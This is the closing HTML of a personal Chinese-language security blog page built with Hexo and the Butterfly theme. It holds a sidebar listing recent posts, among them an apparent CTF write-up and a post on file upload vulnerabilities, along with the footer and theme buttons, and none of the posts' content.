class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/22/Renderme-wp/" title="Renderme_wp">Renderme_wp</a><time datetime="2025-12-22T08:18:21.000Z" title="发表于 2025-12-22 16:18:21">2025-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2025-11-29T01:16:52.000Z" title="发表于 2025-11-29 09:16:52">2025-11-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/27/hello-world/" title="Hello World">Hello World</a><time datetime="2025-11-27T14:08:36.522Z" title="发表于 2025-11-27 22:08:36">2025-11-27</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Lyifan</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="golem-mascot"></div><script src="/js/golem-mascot.js"></script><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
